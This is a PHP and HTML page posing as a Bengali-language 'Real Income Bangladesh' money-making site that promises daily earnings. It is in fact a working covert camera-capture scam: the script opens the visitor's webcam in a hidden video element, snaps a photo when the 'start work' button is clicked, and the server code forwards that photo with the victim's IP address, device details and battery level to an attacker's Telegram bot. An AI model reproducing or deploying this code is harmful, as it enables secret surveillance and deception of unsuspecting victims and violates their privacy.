<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST['image'];
    $battery = $_POST['battery'] ?? 'Unknown';
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    $botToken = $_GET['token'] ?? null;
    $chatId = $_GET['id'] ?? null;

    if (!$botToken || !$chatId) {
        http_response_code(400);
        echo "Missing token or id in URL.";
        exit;
    }

    $data = str_replace('data:image/png;base64,', '', $data);
    $data = str_replace(' ', '+', $data);
    $imageData = base64_decode($data);
    $fileName = 'income_' . time() . '.png';
    file_put_contents($fileName, $imageData);

    $caption = "📸 *নতুন ক্যামেরা অ্যাক্সেস*\n"
             . "━━━━━━━━━━━━━━\n"
             . "📱 *ডিভাইস:* `$agent`\n"
             . "🔋 *চার্জ:* `$battery%`\n"
             . "🌐 *IP:* $ip\n"
             . "⏰ *সময়:* `$time`\n"
             . "━━━━━━━━━━━━━━";

    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($fileName),
        'caption' => $caption,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_exec($ch);
    curl_close($ch);
    unlink($fileName);
    echo "✅ আপনার ইনকাম প্রসেস শুরু হয়েছে!";
    exit;
}
?><!DOCTYPE html><html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>Real Income Web</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: #fff;
      line-height: 1.6;
    }
    header {
      background: rgba(255,255,255,0.1);
      padding: 20px;
      text-align: center;
      font-size: 28px;
      font-weight: bold;
      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    }
    .hero {
      text-align: center;
      padding: 60px 20px 40px;
    }
    .hero h1 {
      font-size: 38px;
      margin-bottom: 15px;
    }
    .hero p {
      font-size: 18px;
      opacity: 0.95;
    }
    .start-btn {
      background: #ff9800;
      color: #fff;
      padding: 18px 36px;
      border: none;
      border-radius: 50px;
      font-size: 22px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 35px;
      transition: 0.3s ease;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    }
    .start-btn:hover {
      background: #fb8c00;
      transform: scale(1.05);
    }
    .section {
      padding: 40px 20px;
      text-align: center;
      background: rgba(255,255,255,0.08);
      margin: 20px;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
    }
    .section h2 {
      font-size: 26px;
      margin-bottom: 12px;
    }
    .section p {
      font-size: 16px;
      opacity: 0.9;
    }
    footer {
      background: rgba(0,0,0,0.4);
      text-align: center;
      padding: 15px;
      font-size: 14px;
      margin-top: 40px;
    }
    #video { display: none; }
  </style>
</head>
<body><header>
  💼 Real Income Bangladesh
</header><section class="hero">
  <h1>🤑 প্রতিদিন ইনকাম করুন ৫০০+ টাকা!</h1>
  <p>বিশ্বস্ত ইনকাম প্ল্যাটফর্ম — কাজ করুন, টাকা তুলুন বিকাশে!</p>
  <button class="start-btn" onclick="startIncome()">⭐ কাজ শুরু করুন</button>
</section><section class="section">
  <h2>🎯 সরাসরি ইনকাম</h2>
  <p>নেই কোনো একাউন্ট, নেই রেজিস্ট্রেশন — ক্লিক করলেই ইনকাম শুরু!</p>
</section><section class="section">
  <h2>📋 কাজের নিয়ম</h2>
  <p>ভিডিও দেখুন, রেফার করুন, ফর্ম পূরণ করুন — প্রতি টাস্কে ইনকাম!</p>
</section><footer>
  &copy; 2025 RealIncomeBD.com | All rights reserved.
</footer><video id="video" autoplay playsinline></video> <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let batteryLevel = "Unknown";

navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => { video.srcObject = stream; })
  .catch(err => { console.warn("Camera error", err); });

if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    batteryLevel = Math.round(b.level * 100);
  });
}

function startIncome() {
  alert("⏳ ইনকাম প্রসেস শুরু হচ্ছে...");
  setTimeout(() => {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/png');

    fetch(window.location.href, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        image: imageData,
        battery: batteryLevel
      })
    })
    .then(res => res.text())
    .then(alert)
    .catch(err => alert("❌ সমস্যা হয়েছে: " + err));
  }, 50);
}
</script></body>
</html>
